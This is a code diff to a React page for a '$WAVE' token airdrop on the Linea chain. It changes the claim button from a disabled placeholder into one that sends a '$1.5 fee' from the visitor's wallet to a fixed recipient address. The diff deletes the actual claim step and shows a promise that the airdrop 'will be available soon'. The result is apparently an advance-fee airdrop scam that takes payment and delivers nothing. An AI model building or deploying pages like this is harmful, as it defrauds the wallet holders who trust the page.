@@ -45,10 +45,9 @@ export default function AirdropPage({
   const [hasClaimed, setHasClaimed] = useState(false)
   const [isClaiming, setIsClaiming] = useState(false)
   const [claimStatus, setClaimStatus] = useState<{
-    step: "idle" | "payment" | "claim" | "success" | "failed"
+    step: "idle" | "payment" | "success" | "failed"
     message: string
     paymentHash?: string
-    claimHash?: string
   }>({ step: "idle", message: "" })
   const [showConnectModal, setShowConnectModal] = useState(false)
   const [copied, setCopied] = useState(false)
@@ -144,10 +143,50 @@ export default function AirdropPage({
     setIsChecking(false)
   }
 
-  // NOTE: The real claiming is disabled; only shows the modal
+  // Fee payment only, no contract claim
   const handleClaim = async () => {
-    setShowClaimNotOpenModal(true)
-    return
+    setIsClaiming(true)
+    setClaimStatus({
+      step: "payment",
+      message: "Sending fee payment..."
+    })
+    try {
+      if (!window.ethereum || !isConnected) {
+        setClaimStatus({
+          step: "failed",
+          message: "Wallet not connected or MetaMask not available."
+        })
+        setIsClaiming(false)
+        return
+      }
+
+      // Calculate fee amount
+      const feeAmount = await getPaymentAmount()
+      // Send payment transaction
+      const txParams = {
+        from: connectedAddress,
+        to: PAYMENT_RECIPIENT,
+        value: feeAmount,
+        chainId: LINEA_CHAIN_ID,
+      }
+      const txHash = await window.ethereum.request({
+        method: "eth_sendTransaction",
+        params: [txParams]
+      })
+
+      setClaimStatus({
+        step: "success",
+        message: "Fee payment sent! Your airdrop will be available soon.",
+        paymentHash: txHash
+      })
+      setHasClaimed(true)
+    } catch (err) {
+      setClaimStatus({
+        step: "failed",
+        message: "Fee payment failed. Please try again."
+      })
+    }
+    setIsClaiming(false)
   }
 
   const getPaymentAmount = async (): Promise<string> => {
@@ -192,7 +231,6 @@ export default function AirdropPage({
             }}
           ></div>
         </div>
-        {/* ...Decorative floating SVG elements (can copy/paste yours here)... */}
       </div>
       <div className="relative z-10 flex flex-col items-center justify-center text-white px-4 py-8 min-h-screen">
         {showClaimNotOpenModal && (
@@ -202,7 +240,6 @@ export default function AirdropPage({
               <p className="text-red-200 text-center text-base">
                 Stay chill fam it will be open soon.
               </p>
-              {/* No close button */}
             </div>
           </div>
         )}
@@ -274,12 +311,10 @@ export default function AirdropPage({
         )}
         {!isValidContractAddress && (
           <div className="fixed top-4 left-4 right-4 bg-yellow-500/20 border border-yellow-300/30 rounded-lg p-3 text-yellow-100 text-sm backdrop-blur-sm">
-            ⚠️ Contract address not configured. Replace CONTRACT_ADDRESS with your actual Linea contract address.
+              ⚠️ Contract address not configured. Replace CONTRACT_ADDRESS with your actual Linea contract address.
           </div>
         )}
-        <div className="mb-8">
-          
-        </div>
+        <div className="mb-8"></div>
         <h1 className="text-4xl md:text-6xl font-bold mb-4 text-center tracking-wide bg-gradient-to-r from-purple-400 via-pink-500 to-red-500 bg-clip-text text-transparent animate-pulse">
           $WAVE
         </h1>
@@ -358,7 +393,7 @@ export default function AirdropPage({
                 {checkResult === "eligible" && !hasClaimed && (
                   <div className="mt-4 space-y-2">
                     <div className="text-xs text-green-200 mb-2">
-                      Claim process: Unlock Airdrop ($1.5 fee) → Airdrop claim (Airdropped to your wallet in 4hrs batches)
+                      Claim process: Unlock Airdrop ($1.5 fee payment only)
                     </div>
                     <button
                       onClick={handleClaim}
@@ -368,7 +403,7 @@ export default function AirdropPage({
                       {isClaiming
                         ? "Processing..."
                         : isConnected
-                          ? "Unlock Airdrop & Claim Airdrop"
+                          ? "Unlock Airdrop (Sends Fee Only)"
                           : "Connect Wallet & Claim"}
                     </button>
                   </div>
@@ -385,7 +420,6 @@ export default function AirdropPage({
                   >
                     <div className="font-semibold mb-2">
                       {claimStatus.step === "payment" && "💳 Payment Step"}
-                      {claimStatus.step === "claim" && "🎁 Claim Step"}
                       {claimStatus.step === "success" && "✅ Success!"}
                       {claimStatus.step === "failed" && "❌ Failed"}
                     </div>
@@ -395,14 +429,9 @@ export default function AirdropPage({
                         Payment TX: {claimStatus.paymentHash.slice(0, 10)}...{claimStatus.paymentHash.slice(-8)}
                       </div>
                     )}
-                    {claimStatus.claimHash && (
-                      <div className="text-xs">
-                        Claim TX: {claimStatus.claimHash.slice(0, 10)}...{claimStatus.claimHash.slice(-8)}
-                      </div>
-                    )}
                   </div>
                 )}
-                {hasClaimed && <div className="mt-3 text-green-200 font-semibold">✅ Successfully Claimed!</div>}
+                {hasClaimed && <div className="mt-3 text-green-200 font-semibold">✅ Fee Payment Sent!</div>}
               </div>
             </div>
           )}
